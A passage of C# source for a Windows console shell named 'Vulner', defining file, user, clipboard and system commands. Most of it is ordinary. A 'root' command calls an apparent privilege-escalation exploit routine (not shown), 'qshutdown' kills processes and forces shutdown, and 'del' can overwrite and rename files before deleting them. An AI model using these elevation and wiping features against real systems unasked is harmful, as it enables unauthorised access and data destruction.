                {
                    Description = "Prints how the arguments got parsed",
                    Examples = new string[]
                    {
                        "{NAME} 'arg1' >"
                    }
                },
                Main = (Argumenter a) =>
                {
                    int e = 0;
                    foreach (object b in a.Parsed)
                    {
                        string i = e + " " + a.FormatStr[e][0];
                        if (b.GetType() == typeof(UserVar))
                        {
                            UserVar ob = ((UserVar)b);
                            if (ob.IsNull())
                            {
                                t.ColorWrite("$f[{0}] $aVulner.Null", i);
                            }
                            else if (ob.Type().IsArray)
                            {
                                t.ColorWrite("$f[{1}] $aVulner.{0} - " + string.Format("$c[ $8{0}$c ]", string.Join("$c | $8", ob.Get<string[]>().Select(o => t.EscapeColor(Funcs.ToType<string>(o))).ToArray())), ob.Type().ToString().Replace("System.", ""), i);
                            }
                            else
                            {
                                t.ColorWrite("$f[{2}] $aVulner.{0} - $f{1}", ob.Type().ToString().Replace("System.", ""), ob.Get<string>(), i);
                            }
                        }
                        else
                        {
                            t.ColorWrite("$f[{2}] $a{0} - $f{1}", b.GetType().ToString().Replace("System.", ""), Funcs.ToType<string>(b), i);
                        }
                        e++;
                    }

                    if (a.Sw.Count != 0)
                    {
                        t.ColorWrite("\n$aSwitches:");
                        foreach (KeyValuePair<string, bool> b in a.Sw)
                        {
                            t.WriteLine("/{0} {1}", b.Key, b.Value);
                        }
                    }

                    if (a.Pr.Count != 0)
                    {
                        t.ColorWrite("\n$aSwitches:");
                        foreach (KeyValuePair<string, string> b in a.Pr)
                        {
                            t.WriteLine("-{0} {1}", b.Key, b.Value);
                        }
                    }
                    return null;
                },
            }.Save(C, new string[] { "args" });
            #endregion
            #region Echo Command
            new Command
            {
                Switches = Util.Array("n"),
                Help = new CommandHelp
                {
                    Description = "Echoes back all arguments",
                    Examples = new string[]
                    {
                        "{NAME} '%temp%/test.exe'",
                    }
                },
                Main = (Argumenter a) =>
                {
                    bool pr = a.GetSw("n");
                    string str = "";
                    foreach (string s in a.Parsed.Skip(1).Select(o => o.Get<string>()))
                    {
                        str += s + (pr ? "" : "\n");
                    }
                    t.Write("{0}", str);
                    return str;
                },
            }.Save(C, new string[] { "echo" });
            #endregion
            #region Echor Command
            new Command
            {
                Switches = Util.Array("n"),
                Help = new CommandHelp
                {
                    Description = "Echoes back raw arguments",
                    Examples = new string[]
                    {
                        "{NAME} '%temp%/test.exe'",
                    }
                },
                Main = (Argumenter a) =>
                {
                    t.WriteLine(a.RawString());
                    return null;
                },
            }.Save(C, new string[] { "echor" });
            #endregion
            #region Nul Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Does absolutely nothing :v",
                    Examples = new string[]
                    {
                        "{NAME}"
                    }
                },
                Main = (Argumenter a) =>
                {
                    return null;
                },
            }.Save(C, new string[] { "nul" });
            #endregion
            #region WhoAmI Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Displays current identity information of Vulner",
                    Usage = new string[] { "{NAME}" }
                },
                Main = (Argumenter a) =>
                {
                    WindowsIdentity c = WindowsIdentity.GetCurrent();
                    t.ColorWrite("$7User Name: $a{0}", Environment.UserName);
                    t.ColorWrite("$7Domain Name: $a{0}", Environment.UserDomainName);
                    t.ColorWrite("$7Name: $a{0}", c.Name);
                    t.ColorWrite("$7Groups:");
                    foreach (var v in c.Groups)
                    {
                        t.ColorWrite("$8 {0}", v.Translate(typeof(NTAccount)).Value);
                    }
                    t.ColorWrite("\n$7Administrator: $a{0}", Funcs.IsAdmin());
                    return null;
                },
            }.Save(C, new string[] { "whoami" });
            #endregion
            #region Users Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Displays all users in this computer",
                    Usage = new string[] { "{NAME}" }
                },
                Main = (Argumenter a) =>
                {
                    ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_UserAccount");
                    t.ColorWrite("$eUsers in this computer:");
                    foreach (ManagementObject envVar in searcher.Get())
                    {
                        t.WriteLine(" {0}", envVar["Name"]);
                    }
                    return null;
                },
            }.Save(C, new string[] { "users" });
            #endregion
            #region Root Command
            new Command
            {
                Switches = Util.Array("f"),
                Help = new CommandHelp
                {
                    Description = "Restarts Vulner as admin",
                    Usage = new string[] { "{NAME}" }
                },
                Main = (Argumenter a) =>
                {
                    string Command = m.FileName;
                    string arg = "";
                    foreach (string s in Environment.GetCommandLineArgs().Skip(1))
                    {
                        arg += string.Format("\"{0}\" ", s.Replace("\"", "\\\""));
                    }
                    if (a.GetSw("f") && Funcs.CheckExploit())
                    {
                        Funcs.Exploit(string.Format("\"{0}\" \"root\" {1}", Command, arg));
                        Environment.Exit(0);
                        return null;
                    }
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = Command,
                            Arguments = string.Format("runas {0}", arg),
                            Verb = "runas",
                        });
                        Environment.Exit(0);
                        return null;
                    }
                    catch (Exception)
                    {
                        t.WriteLine("Failed to get admin rights");
                    }
                    return null;
                },
            }.Save(C, new string[] { "root" });
            #endregion
            #region Clear Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Clears screen",
                    Examples = new string[] { "{NAME}" }
                },
                Main = (Argumenter a) =>
                {
                    t.WriteLine(new string('\n', 50));
                    return null;
                },
            }.Save(C, new string[] { "clear", "cls" });
            #endregion
            #region Exit Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Closes Vulner",
                    Usage = new string[] { "{NAME}" }
                },
                Main = (Argumenter a) =>
                {
                    Environment.Exit(0);
                    return null;
                },
            }.Save(C, new string[] { "exit" });
            #endregion
            #region Die Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Forcibly Vulner",
                    Usage = new string[] { "{NAME}" }
                },
                Main = (Argumenter a) =>
                {
                    Process.GetCurrentProcess().Kill();
                    return null;
                },
            }.Save(C, new string[] { "die" });
            #endregion
            #region Help Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Displays help messages",
                    Usage = new string[]
                    {
                        "{NAME}",
                        "{NAME} command"
                    }
                },
                Main = (Argumenter a) =>
                {
                    a.CaseSensitive = false;
                    string comma = a.GetRaw(1);
                    if (a.Get(1) == string.Empty)
                    {
                        t.WriteLine("Commands:");
                        foreach (KeyValuePair<string, Command> c in m.Cmds)
                        {
                            t.SetForeColor('f');
                            if (c.Key == string.Empty) { continue; }
                            if (c.Value.Help.Description != string.Empty && (c.Value.Alias == c.Key || c.Value.Alias == string.Empty) && c.Key != string.Empty)
                            {
                                string[] al = m.Cmds.Where(b => b.Key != "" && b.Value.Alias == c.Key).Select(b => b.Key).ToArray();
                                t.ColorWrite("$7{0} - $8{1}", string.Join(", ", al).ToUpper().ToUpper(), c.Value.Help.Description);
                            }
                            else if (c.Value.Alias == c.Key || c.Value.Alias == string.Empty)
                            {
                                string[] al = m.Cmds.Where(b => b.Key != "" && b.Value.Alias == c.Key).Select(b => b.Key).ToArray();
                                t.ColorWrite("$7{0}", string.Join(", ", al).ToUpper().ToUpper());
                            }
                        }
                    }
                    else
                    {
                        Command e = null;
                        try
                        {
                            e = m.Cmds[a.GetRaw(1)];
                        }
                        catch (KeyNotFoundException)
                        {
                            t.WriteLine("'{0}' is not a recognized command.", comma);
                            return 0;
                        }

                        if (!Equals(e.Help, null))
                        {
                            e.Help.Print(t, e);

                            string[] al = m.Cmds.Where(b => b.Value.Alias == C[a.Get(1)].Alias).Select(b => b.Key).ToArray();
                            t.ColorWrite("\n$8Aliases: $7{0}", string.Join(", ", al).ToUpper());
                        }
                        else
                        {
                            t.WriteLine("Command has no help attached.");
                        }
                    }
                    return null;
                }
            }.Save(C, new string[] { "help" });
            #endregion
            #region Size Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Changes console window size",
                    LongDesc = "Values get clamped to h=80, w=25 and largest window sizes based on font and \nscreen resolution, so it will never be too small to read.",
                    Usage = new string[] {
                                    "{NAME} [w] [h]",
                                    "{NAME} [w]",
                                    "{NAME} 0 [h]",
                                },
                    Examples = new string[]
                    {
                                    "{NAME} 200 40"
                    }
                },
                Main = (Argumenter a) =>
                {
                    int w = a.Int(1);
                    int h = a.Int(2);
                    if (w == 0) w = Console.WindowHeight;
                    if (w == 0) h = Console.WindowWidth;

                    w = Math.Min(Math.Max(w, 80), Console.LargestWindowWidth);
                    h = Math.Min(Math.Max(h, 25), Console.LargestWindowHeight);

                    Console.BufferWidth = Console.WindowWidth = w;
                    Console.WindowHeight = h;
                    t.WriteLine("Size = {0},{1}", w, h);
                    return null;
                },
            }.Save(C, new string[] { "size" }, __debug__);
            #endregion
            #region Hide Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Runs all arguments as commands without output",
                    Examples = new string[]
                    {
                        "{NAME} \"dns google.com > dns.txt\""
                    }
                },
                Main = (Argumenter a) =>
                {
                    foreach (string c in a.Parsed.Skip(1).StringArray())
                    {
                        t.hide = true;
                        m.RunCommand(c);
                    }
                    t.hide = false;
                    return null;
                },
            }.Save(C, new string[] { "hide" }, __debug__);
            #endregion
            #region MsgBox Command
            Dictionary<string, MessageBoxIcon> ms = new Dictionary<string, MessageBoxIcon>()
            {
                { "", MessageBoxIcon.None },
                { "none", MessageBoxIcon.None },

                { "x", MessageBoxIcon.Error },
                { "*", MessageBoxIcon.Asterisk },
                { "!", MessageBoxIcon.Exclamation },
                { "?", MessageBoxIcon.Question },

                { "info", MessageBoxIcon.Information },
                { "hand", MessageBoxIcon.Hand },
                { "stop", MessageBoxIcon.Stop },
                { "warn", MessageBoxIcon.Warning },
            };
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Shows a message box",
                    LongDesc = @"Icon list:
            """" = None
            ""none"" = None
            ""x"" = Error
            ""*"" = Asterisk
            ""!"" = Exclamation
            ""?"" = Question
            ""info"" = Information
            ""hand"" = Hand
            ""stop"" = Stop
            ""warn"" = Warning",
                    Usage = new string[]
                    {
                                    "{NAME} [text] [title] [icon]"
                    }
                },
                Main = (Argumenter a) =>
                {
                    if (!ms.ContainsKey(a.Get(3))) { return null; }
                    string title = a.Get(2);
                    MessageBoxIcon mbb = ms[a.Get(3)];
                    if (title.Length == 0) { title = m.Name; }
                    MessageBox.Show(a.Get(1), title, MessageBoxButtons.OK, mbb);
                    return null;
                },
            }.Save(C, new string[] { "msgbox" }, __debug__);
            #endregion
            #region Wait Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Waits first argument in milliseconds",
                    Usage = new string[]
                    {
                        "{NAME} [ms]"
                    }
                },
                Main = (Argumenter a) =>
                {
                    int time = a.Int(1, 0);
                    Thread.Sleep(time);
                    return null;
                },
            }.Save(C, new string[] { "wait" }, __debug__);
            #endregion
            #region Each Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    //try
                    //{
                    UserVar v = a.Parsed[1];
                    string[] vars = ((object[])v.Val()).Select(o => o.ToString()).ToArray();
                    string c = a.Get(2);
                    foreach (string s in vars)
                    {
                        t.KillBuffer();
                        t.hide = true;
                        m.RunCommand(string.Format(c, s), false);
                    }
                    //}
                    //catch (Exception) { }
                    return null;
                },
            }.Save(C, new string[] { "each" }, __debug__);
            #endregion
            #region For Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Does a for loop",
                    Examples = Util.Array("{NAME} 'command %i%' 1 10"),
                    Usage = Util.Array("{NAME} [command] [start=0] [end=10] [jump=1]")
                },
                Main = (Argumenter a) =>
                {
                    int i = a.Int(2, 0);
                    int u = a.Int(3, 10);
                    int f = a.Int(4, 1);
                    for (; i < u; i += f)
                    {
                        Environment.SetEnvironmentVariable("i", i.ToString(), EnvironmentVariableTarget.Process);
                        m.RunCommand(a.Get(1));
                    }
                    Environment.SetEnvironmentVariable("i", null, EnvironmentVariableTarget.Process);
                    return null;
                },
            }.Save(C, new string[] { "for" }, __debug__);
            #endregion
            #region CB Command (ClipBoard)
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Gets or sets the clipboard text",
                    Usage = Util.Array("{NAME} [text]"),
                },
                Main = (Argumenter a) =>
                {
                    if (a.Get(1) != string.Empty)
                    {
                        Clipboard.SetText(a.Get(1));
                    }
                    t.ColorWrite("$a{0}", Clipboard.GetText());
                    return Clipboard.GetText();
                },
            }.Save(C, new string[] { "cb" }, __debug__);
            #endregion
            #region QShutdown Command ( Quick Shutdown )
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    Process[] pr = Process.GetProcesses();
                    int pid = Process.GetCurrentProcess().Id;
                    foreach (Process p in pr)
                    {
                        if (p.Id == pid) { continue; }
                        try
                        {
                            if (p.MainModule.FileName.ToLower().Contains("windows")) { continue; }
                            p.Kill();
                        }
                        catch (Exception) { }
                    }
                    Process.Start("shutdown", "-s -t 0");
                    return null;
                },
            }.Save(C, new string[] { "qshutdown" }, __debug__);
            #endregion
            #endregion

            #region File Commands
            #region MkDir Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Creates a directory",
                    Examples = Util.Array(
                            "{NAME} dir",
                            "{NAME} works/with/sub/directories/too"
                        )
                },
                Main = (Argumenter a) =>
                {
                    foreach (string s in a.Parsed.Select(g => g.Get<string>()).Skip(1))
                    {
                        try
                        {
                            DirectoryInfo d = new DirectoryInfo(Path.Combine(Environment.CurrentDirectory, s));
                            List<DirectoryInfo> str = new List<DirectoryInfo>();
                            str.Add(d);
                            while (true)
                            {
                                try
                                {
                                    d = d.Parent;
                                    if (Equals(d.Parent, null)) break; // Means that it is a root drive.
                                    str.Add(d);
                                }
                                catch (Exception) { }
                            }
                            str.Reverse();
                            t.SetForeColor('a');
                            foreach (DirectoryInfo dir in str)
                            {
                                if (!dir.Exists)
                                {
                                    dir.Create();
                                    t.WriteLine("{0}", Funcs.DriveLetterToUpper(dir.FullName));
                                }
                            }
                        }
                        catch (Exception) { }
                    }
                    return null;
                },
            }.Save(C, new string[] { "mkdir" }, __debug__);
            #endregion
            #region RD Command ( Remove Directory )
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Deletes directories",
                    Examples = Util.Array("{NAME} 'dir' 'otherdir'")
                },
                Main = (Argumenter a) =>
                {
                    foreach (string b in a.Parsed.Skip(1).StringArray())
                    {
                        try
                        {
                            DirectoryInfo d = new DirectoryInfo(Path.Combine(Environment.CurrentDirectory, b));
                            d.Delete();
                            t.ColorWrite("$a{0}", d.FullName);
                        }
                        catch (Exception) { }
                    }
                    return null;
                },
            }.Save(C, new string[] { "rd" }, __debug__);
            #endregion
            #region Cat Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Print file contents to output",
                    Usage = new string[] { "{NAME}" }
                },
                Main = (Argumenter a) =>
                {
                    FileInfo f = new FileInfo(a.Get(1));
                    if (f.Exists)
                    {
                        try
                        {
                            if (a.ExpectsOutput)
                            {
                                return System.IO.File.ReadAllBytes(f.FullName);
                            }
                            string s = System.IO.File.ReadAllText(f.FullName);
                            t.SetForeColor(t.ltc['8']);
                            t.WriteLine(s.Replace('\a', '\0'));
                            return System.IO.File.ReadAllBytes(f.FullName);
                        }
                        catch (IOException ex)
                        {
                            return Error("An error has ocourred.\n{0}", ex.Message);
                        }
                    }
                    else
                    {
                        return Error("File not found.");
                    }
                },
            }.Save(C, new string[] { "cat" });
            #endregion
            #region CD Command ( Change Directory )
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Changes current working directory",
                    Usage = new string[]
                    {
                        "{NAME} path",
                        "{NAME}",
                    },
                    Examples = new string[]
                    {
                        "{NAME} C:/full/path/",
                        "{NAME} relative/path/",
                        "{NAME} system32",
                        "{NAME} .."
                    }
                },
                Main = (Argumenter a) =>
                {
                    a.CaseSensitive = false;
                    bool changed = false;
                    string str = a.RawString(true);
                    if (str != "")
                    {
                        string[] Paths = new string[] {
                                Path.Combine(Environment.CurrentDirectory, Environment.ExpandEnvironmentVariables(str)),
                                Environment.ExpandEnvironmentVariables(str),
                                Environment.GetEnvironmentVariable(str) ?? ""
                        };
                        foreach (string s in Paths)
                        {
                            try
                            {
                                if (new DirectoryInfo(s).Exists && !changed)
                                {
                                    Funcs.ChangeDir(new DirectoryInfo(s).FullName);
                                    changed = true;
                                    break;
                                }
                            }
                            catch (Exception) { }
                        }
                        foreach (Environment.SpecialFolder s in Enum.GetValues(typeof(Environment.SpecialFolder)))
                        {
                            try
                            {
                                if (str == s.ToString().ToLower() && !changed)
                                {
                                    string p = Environment.GetFolderPath(s);
                                    if (new DirectoryInfo(p).Exists)
                                    {
                                        Funcs.ChangeDir(new DirectoryInfo(p).FullName);
                                        changed = true;
                                        break;
                                    }
                                }
                            }
                            catch (Exception) { }
                        }
                        foreach (string s in Environment.GetEnvironmentVariable("path").Split(';'))
                        {
                            try
                            {
                                if (new DirectoryInfo(s).Name.ToLower() == str && !changed)
                                {
                                    Funcs.ChangeDir(new DirectoryInfo(s).FullName);
                                    changed = true;
                                    break;
                                }
                            }
                            catch (Exception) { }
                        }
                        if (!changed)
                        {
                            return Error("Directory not found!");
                        }
                    }
                    t.ColorWrite("$fWorking directory: $a{0}", Environment.CurrentDirectory);
                    return null;
                }
            }.Save(C, new string[] { "cd" });
            #endregion
            #region Ls Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Lists files and folders in a directory",
                    Usage = new string[] { "{NAME}" }
                },
                Main = (Argumenter a) =>
                {
                    string M = a.Get(1).Length == 0 ? "*" : a.Get(1);
                    t.ColorWrite("$e{0}", Path.Combine(Environment.CurrentDirectory, M));
                    string[] Af = Funcs.GetFilesSmarty(M, false);
                    Af = Funcs.GetDirsSmarty(M, false).Concat(Af).ToArray();
                    if (a.ExpectsOutput) { return Af; }
                    foreach (string Fil in Af)
                    {
                        FileInfo f = new FileInfo(Fil);
                        string attr = "";
                        attr += ((int)f.Attributes & (int)FileAttributes.Directory) == 0 ? '-' : 'D';
                        attr += ((int)f.Attributes & (int)FileAttributes.ReadOnly) == 0 ? '-' : 'R';
                        attr += ((int)f.Attributes & (int)FileAttributes.Hidden) == 0 ? '-' : 'H';
                        attr += ((int)f.Attributes & (int)FileAttributes.System) == 0 ? '-' : 'S';

                        t.ColorWrite("$a{0} $8{1}", attr, f.Name);
                    }
                    return null;
                },
            }.Save(C, new string[] { "ls" });
            #endregion
            #region Del Command
            new Command
            {
                Switches = new string[] { "r", "f" },
                Parameters = new string[] { "p" },
                Help = new CommandHelp
                {
                    Description = "Deletes files and folders",
                    Switches = new Dictionary<string, string> { { "r", "Recursive" } },
                    Usage = new string[] {
                                        "{NAME} [filename]",
                                        "{NAME} [match]",
                                    },
                    Examples = new string[]
                    {
                                        "{NAME} *.txt $8Deletes all .txt files in current directory",
                                        "{NAME} *.txt /r $8Deletes all .txt files in current directory and in all subdirectories",
                                        "{NAME} * $8Deletes everything in folder",
                                        "{NAME} $8Same effect",
                    }
                },
                Main = (Argumenter a) =>
                { // DirectoryInfo
                    string h = a.Get(1).Length != 0 ? a.Get(1) : "*";

                    new Thread(() => System.Media.SystemSounds.Hand.Play()).Start();
                    if (!a.GetSw("f"))
                    {
                        t.ColorWrite("$eAre you sure you want to delete: $f{0} $f($aYes$f/$cNo$f)", Path.Combine(Environment.CurrentDirectory, h));
                        if ((t.FancyInput() + "n").ToLower()[0] != 'y') { return null; }
                    }

                    Dictionary<string, int> Exceptions = new Dictionary<string, int>{
                                        { "Access", 0 },
                                        { "IO", 0 },
                                        { "Generic", 0 }
                    };
                    bool R = a.GetSw("r");
                    int FileJump = 1;
                    int DirJump = 1;

                    string CurDir = Environment.CurrentDirectory;

                    string fl = a.Get(1);
                    FileInfo tmpf = null;

                    try
                    {
                        if (new FileInfo(a.Get(1)).DirectoryName != new FileInfo(CurDir).DirectoryName)
                        {
                            tmpf = new FileInfo(a.Get(1));
                            fl = tmpf.Name;
                            h = tmpf.Name;
                            Environment.CurrentDirectory = tmpf.Directory.FullName;
                        }
                    }
                    catch (Exception) { }

                    t.SetForeColor('2');
                    t.WriteLine("Indexing directory...");
                    string[] Files = Funcs.GetFilesSmarty(h, false);
                    string[] Dirs = Funcs.GetDirsSmarty(R ? "*" : h, false);
                    HashSet<string> fls = new HashSet<string>();
                    HashSet<string> drs = new HashSet<string>();
                    try
                    {
                        if (new DirectoryInfo(Path.Combine(Environment.CurrentDirectory, h)).Exists)
                        {
                            drs.Add(Path.Combine(Environment.CurrentDirectory, h));
                        }
                    }
                    catch (Exception) { }
                    foreach (string s in Files) { fls.Add(s); }

                    Func<string[], int> Recursive = null;
                    int count = fls.Count;
                    int oldc = count;

                    t.Write("File count: ");
                    Writable w = t.GetWritable(30);
                    t.WriteLine();

                    int dcount = drs.Count;
                    int doldc = dcount;

                    t.Write("Searched directories: ");
                    Writable dw = t.GetWritable(30);
                    t.WriteLine();

                    w.Write(count);
                    dw.Write(dcount);
                    int time = Environment.TickCount;

                    string Search = R ? fl : "*";
                    Recursive = (d) =>
                    {
                        foreach (string s in d)
                        {
                            dcount++;
                            DirectoryInfo dir = new DirectoryInfo(s);
                            if (!dir.Exists) { return 0; }
                            try
                            {
                                Environment.CurrentDirectory = dir.FullName;
                                string[] F = Funcs.GetFilesSmarty(Search, false);
                                string[] D = Funcs.GetDirsSmarty(Search, false);

                                if (!R) { drs.Add(s); }
                                foreach (string r in F) { fls.Add(r); }
                                count += F.Length + D.Length;
                                if (count - oldc > FileJump)
                                {
                                    FileJump = Math.Min((int)(FileJump * 1.5 + 20), 500);
                                    w.Write(count);
                                    oldc = count;
                                }
                                if (dcount - doldc > DirJump)
                                {
                                    DirJump = Math.Min((int)(DirJump * 1.5 + 20), 500);
                                    dw.Write(dcount);
                                    doldc = dcount;
                                }
                                if (R)
                                {
                                    Recursive.Invoke(Directory.GetDirectories(Environment.CurrentDirectory));
                                }
                                else
                                {
                                    Recursive.Invoke(D);
                                }
                            }
                            catch (IOException) { Exceptions["IO"]++; }
                            catch (UnauthorizedAccessException) { Exceptions["Access"]++; }
                            catch (Exception) { Exceptions["Generic"]++; }
                        }
                        return 0;
                    };
                    Recursive(Dirs); // All indexing is done here
                    Environment.CurrentDirectory = new DirectoryInfo(CurDir).Root.FullName;
                    w.Write(count);
                    dw.Write(dcount);

                    w = null; dw = null;

                    t.WriteLine("Done indexing!");
                    t.WriteLine("The process took {0:0.00} seconds", (Environment.TickCount - time) / 1000);
                    t.WriteLine();

                    int all = fls.Count + drs.Count;
                    if (all == 0)
                    {
                        t.ColorWrite("$eNothing found...");
                    }
                    else
                    {
                        t.WriteLine("Removing all attributes...");
                        foreach (string s in fls) { System.IO.File.SetAttributes(s, 0); }
                        foreach (string s in drs) { System.IO.File.SetAttributes(s, 0); }
                        t.WriteLine();

                        count = 0;
                        oldc = 0;
                        t.Write("Deleted: ");
                        w = t.GetWritable(30);
                        w.Write(string.Format("{0}/{1} ({2:0.00}%)", count, all, (double)((double)count / (double)all) * 100.0));
                        t.WriteLine();

                        int passes = a.Int("p", 0);

                        FileJump = 0;
                        foreach (string f in fls)
                        {
                            try
                            {
                                string nam = f;
                                if (passes > 0)
                                {
                                    FileInfo fi = new FileInfo(f);
                                    long fll = fi.Length;
                                    string dn = fi.DirectoryName;
                                    string fn = fi.Name;
                                    bool sc = false;
                                    for (int i = 0; i < passes; i++)
                                    {
                                        System.IO.File.WriteAllBytes(f, Funcs.RandomBytes(fll));
                                    }
                                    for (int i = 0; i < passes; i++)
                                    {
                                        int k = 0;
                                        while (!sc)
                                        {
                                            try
                                            {

                                                string newn = Path.Combine(dn, Funcs.RandomString(fn.Length + k++));
                                                System.IO.File.Move(nam, newn);
                                                nam = newn;
                                                sc = true;
                                            }
                                            catch (IOException) { }
                                        }
                                    }
                                }
                                System.IO.File.Delete(nam);
                                count++;
                                if (count - oldc > FileJump)
                                {
                                    FileJump = Math.Min((int)(FileJump * 1.5 + 20), 500);
                                    oldc = count;
                                    w.Write(string.Format("{0}/{1} ({2:0.00}%)", count, all, (double)((double)count / (double)all) * 100.0));
                                }
                            }
                            catch (IOException) { Exceptions["IO"]++; }
                            catch (UnauthorizedAccessException) { Exceptions["Access"]++; }
                            catch (Exception) { Exceptions["Generic"]++; }
                        }
                        w.Write(count);
                        foreach (string f in drs.Reverse()) // Subdirectories first
                        {
                            try
                            {
                                string nam = f;
                                if (passes > 0)
                                {
                                    DirectoryInfo fi = new DirectoryInfo(f);
                                    string dn = fi.Parent.FullName;
                                    string fn = fi.Name;
                                    bool sc = false;
                                    for (int i = 0; i < passes; i++)
                                    {
                                        int k = 0;
                                        while (!sc)
                                        {
                                            try
                                            {
                                                string newn = Path.Combine(dn, Funcs.RandomString(fn.Length + k++));
                                                Directory.Move(nam, newn);
                                                nam = newn;
                                                sc = true;
                                            }
                                            catch (IOException) { }
                                        }
                                    }
                                }
                                Directory.Delete(nam);
                                count++;
                                if (count - oldc > FileJump)
                                {
                                    FileJump = Math.Min((int)(FileJump * 1.5 + 20), 500);
                                    oldc = count;
                                    w.Write(string.Format("{0}/{1} ({2:0.00}%)", count, all, (double)((double)count / (double)all) * 100.0));
                                }
                            }
                            catch (IOException) { Exceptions["IO"]++; }
                            catch (UnauthorizedAccessException) { Exceptions["Access"]++; }
                            catch (Exception) { Exceptions["Generic"]++; }
                        }
                        w.Write(string.Format("{0}/{1} ({2:0.00}%)", count, all, (double)((double)count / (double)all) * 100.0));

                        if (Exceptions["IO"] > 0 || Exceptions["Access"] > 0 || Exceptions["Generic"] > 0)
                        {
                            t.ColorWrite("Errors during the process:");
                            if (Exceptions["IO"] > 0) { t.ColorWrite("$c File system: {0}", Exceptions["IO"]); }
                            if (Exceptions["Access"] > 0) { t.ColorWrite("$c Unauthorized access: {0}", Exceptions["Access"]); }
                            if (Exceptions["Generic"] > 0) { t.ColorWrite("$c Generic: {0}", Exceptions["Generic"]); }
                        }
                    }
                    Environment.CurrentDirectory = CurDir;

                    return null;
                },
            }.Save(C, new string[] { "del" });
            #endregion
            #region Mv Command ( MoVe )
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Moves files",
                    Usage = new string[]
                    {
                                        "{NAME} [match find] [match replace]"
                    },
                    Examples = new string[]
                    {
                                        "{NAME} *.* $$i.$$2 $8Renames all files to an increasing integer",
                                        "{NAME} *.bin $$1.exe $8Changes all .bin files to .exe",
                                        "{NAME} *.* folder/$$0 $8Moves files withour renaming them"
                    }
                },
                Main = (Argumenter a) =>
                {
                    if (a.Get(1).Length > 0 && a.Get(2).Length > 0)
                    {
                        Funcs.RegexRename(a.Get(1), a.Get(2), t);
                    }
                    else
                    {
                        t.WriteLine("Please provide valid input.");
                    }
                    return null;
                },
            }.Save(C, new string[] { "mv" });
            #endregion
            #region Copy Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Moves files",
                    Usage = new string[]
                    {
                                        "{NAME} [match find] [match replace]"
                    },
                    Examples = new string[]
                    {
                                        "{NAME} *.* $$i.$$2 $8Copies and renames all files to an increasing integer",
                                        "{NAME} *.bin $$1.exe $8Copies and renames all .bin files to .exe",
                                        "{NAME} *.* folder/$$0 $8Copies files withour renaming them"
                    }
                },
                Main = (Argumenter a) =>
                {
                    if (a.Get(1).Length > 0 && a.Get(2).Length > 0)
                    {
                        Funcs.RegexRename(a.Get(1), a.Get(2), t, true);
                    }
                    else
                    {
                        t.WriteLine("Please provide valid input.");
                    }
                    return null;
                },
            }.Save(C, new string[] { "copy" });
            #endregion
            #region Attrib Command
            FileAttributes AllAttribs = 0;
            foreach (FileAttributes a in Enum.GetValues(typeof(FileAttributes)))
            {
                AllAttribs = AllAttribs | a;
            }
            Dictionary<Char, FileAttributes> AllAttr = new Dictionary<char, FileAttributes>
                            {
                                { 'r', FileAttributes.ReadOnly },
                                { 's', FileAttributes.System },
                                { 'h', FileAttributes.Hidden },
                                { 't', FileAttributes.Temporary },
                                { 'e', FileAttributes.Encrypted },
                                { 'o', FileAttributes.Offline },
                                { 'n', FileAttributes.Normal },
                                { 'c', FileAttributes.Compressed },
                                { 'd', FileAttributes.Device },
                                { 'i', FileAttributes.NotContentIndexed },
                                { 'R', FileAttributes.ReparsePoint },
                                { 'P', FileAttributes.SparseFile },
                                { '*', AllAttribs }
                            };
            new Command
            {
                ParsePR = false,
                ParseSW = false,
                Help = new CommandHelp
                {
                    Description = "File attribute manager",
                    Examples = new string[]
                    {
                                        "{NAME} $8Lists attributes and corresponding characters",
                                        "{NAME} * -*+h $8Removes all attributes and add hidden attribute to all files",
                                        "{NAME} * +hr $8Add readonly and hidden attributes to all files",
                    },
                    Usage = new string[]
                    {
                                        "{NAME}",
                                        "{NAME} [files]",
                                        "{NAME} [files] [-attribs][+attribs]"
                    }
                },
                Main = (Argumenter a) =>
                {
                    if (a.Get(1).Length == 0)
                    {
                        foreach (KeyValuePair<Char, FileAttributes> kp in AllAttr)
                        {
                            t.ColorWrite("$a{0} $f- {1}", kp.Key, kp.Value);
                        }
                        return null;
                    }
                    string[] files = Funcs.GetFilesSmarty(a.Get(1), false);
                    string all = "";
                    foreach (KeyValuePair<Char, FileAttributes> kp in AllAttr) { all += kp.Key; }

                    if (a.Get(2).Length > 0)
                    {
                        foreach (string f in files)
                        {
                            FileInfo fl = new FileInfo(f);
                            FileAttributes fa = fl.Attributes;

                            char mode = '+';
                            foreach (char ch in a.Get(2))
                            {
                                if ("+-".Contains(ch)) { mode = ch; }
                                FileAttributes cur = 0;
                                AllAttr.TryGetValue(ch, out cur);
                                if ((int)cur != 0)
                                {
                                    if (mode == '+')
                                    {
                                        fa = fa | AllAttr[ch];
                                    }
                                    if (mode == '-')
                                    {
                                        fa = (FileAttributes)(fa - (fa & AllAttr[ch]));
                                    }
                                }
                            }

                            fl.Attributes = fa;
                        }
                    }

                    t.ColorWrite("$e{0} Filename", all);
                    foreach (string f in files)
                    {
                        FileInfo fl = new FileInfo(f);
                        FileAttributes fa = fl.Attributes;
                        string fi = "";
